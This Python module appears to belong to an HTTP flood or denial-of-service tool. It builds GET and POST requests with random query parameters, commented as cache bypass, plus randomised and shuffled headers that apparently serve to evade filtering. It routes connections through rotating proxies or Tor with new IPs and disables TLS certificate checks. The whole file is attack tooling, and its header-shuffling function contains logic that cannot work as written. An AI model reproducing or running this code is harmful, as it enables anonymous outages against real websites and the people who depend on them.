import socks,socket,ssl
from .proxer.proxies_getter import Proxies_Getter
from ..common.payloads import *
import secrets

class Socket_Connection:

    @staticmethod
    def wrap_socket_with_ssl(sock,target_host):
        if sock==None:
            return
        if hasattr(ssl, 'PROTOCOL_TLS_CLIENT'):
            # Since Python 3.6
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        elif hasattr(ssl, 'PROTOCOL_TLS'):
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        else:
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)#ssl.PROTOCOL_TLS)
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        return ssl_context.wrap_socket(sock, server_hostname=target_host)

    @staticmethod
    def reorder_headers_randomly(s):
        b = s.split("\r\n\r\n")[1]
        a = s.split("\r\n\r\n")[0]
        m = a.split("\r\n")[0]
        c = a.split("\r\n")[1:]
        secrets.SystemRandom().shuffle(c)
        num=secrets.SystemRandom().randint(1,4)
        i=[]
        while len(i)>num:
            q=secrets.choice(c)
            if 'host:' not in q.lower() or 'user-agent:' not in q.lower() or 'content-length' not in q.lower():
                i.append(q)
        for x in i:
            if x in c:
                c.remove(x)
        return m + "\r\n" + "\r\n".join(c) + "\r\n\r\n" + b


    @staticmethod
    def random_param():
        a = secrets.SystemRandom().randint(1, 2)
        if a == 1:
            return str(secrets.SystemRandom().randint(1, 1000))
        else:
            return secrets.choice(Common_Variables.source_string)


    @staticmethod
    def setup_http_packet(
        target,
        ty,
        paths,
        post_field_min,
        post_field_max,
        post_min,
        post_max,
        cookie,
        user_agents,
    ):
        pa = secrets.choice(paths)  # bypassing cache engine
        q = ""
        for i in range(secrets.SystemRandom().randint(2, 5)):
            q += Socket_Connection.random_param() + Socket_Connection.random_param()
        p = ""
        for i in range(secrets.SystemRandom().randint(2, 5)):
            p += Socket_Connection.random_param() + Socket_Connection.random_param()
        if "?" in pa:
            jo = "&"
        else:
            jo = "?"
        pa += jo + q + "=" + p
        # setting random headers
        for l in range(secrets.SystemRandom().randint(1, 5)):
            ed = secrets.choice(Common_Variables.accept_encoding_list)
            oi = secrets.SystemRandom().randint(1, 3)
            if oi == 2:
                gy = 0
                while gy < 1:
                    df = secrets.choice(Common_Variables.accept_encoding_list)
                    if df != ed:
                        gy += 1
                ed += ", "
                ed += df
        l = secrets.choice(Common_Variables.accept_language_list)
        for n in range(secrets.SystemRandom().randint(0, 5)):
            l += ";q={},".format(round(secrets.SystemRandom().uniform(0.1, 1), 1)) + secrets.choice(Common_Variables.accept_language_list)
        kl = secrets.SystemRandom().randint(1, 2)
        ck = ""
        if cookie:
            ck = "Cookie: " + cookie + "\r\n"
        if ty == 1:
            m = "GET {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(
                pa,
                ck,
                secrets.choice(user_agents),
                secrets.choice(Common_Variables.accept_list),
                l,
                ed,
                secrets.choice(Common_Variables.accept_charset_list),
                secrets.SystemRandom().randint(100, 1000),
                secrets.choice(Common_Variables.cache_control_list),
                (
                    secrets.choice(Common_Variables.referers_list)
                    + secrets.choice(Common_Variables.source_string)
                    + str(secrets.SystemRandom().randint(0, 100000000))
                    + secrets.choice(Common_Variables.source_string)
                ),
                target,
            )
        else:
            k = ""
            for _ in range(secrets.SystemRandom().randint(post_field_min, post_field_max)):
                k += secrets.choice(Common_Variables.source_string)
            j = ""
            for x in range(secrets.SystemRandom().randint(post_min, post_max)):
                j += secrets.choice(Common_Variables.source_string)
            par = j + "=" + k
            m = "POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(
                pa,
                ck,
                secrets.choice(user_agents),
                l,
                secrets.SystemRandom().randint(300, 1000),
                len(par),
                (
                    secrets.choice(Common_Variables.referers_list)
                    + secrets.choice(Common_Variables.source_string)
                    + str(secrets.SystemRandom().randint(0, 100000000))
                    + secrets.choice(Common_Variables.source_string)
                ),
                target,
                par,
            )
        return Socket_Connection.reorder_headers_randomly(m)




    @staticmethod
    def get_socket_connection(host,port,timeout=5,no_delay=False,ssl_wrap=False,**kwargs):
        s=Proxies_Getter.get_proxy_socket(host,port,timeout=timeout,no_delay=no_delay,**kwargs)
        if ssl_wrap==True:
            s=Socket_Connection.wrap_socket_with_ssl(s,host)
        return s


    @staticmethod
    def get_tor_socket_connection(host,port,new_ip=True,ssl_wrap=False,timeout=5,no_delay=False,**kwargs):
        s=Proxies_Getter.get_tor_socks5_socket(host,port,new_ip=new_ip,timeout=timeout,no_delay=no_delay,**kwargs)
        if ssl_wrap==True:
            s=Socket_Connection.wrap_socket_with_ssl(s,host)
        return s




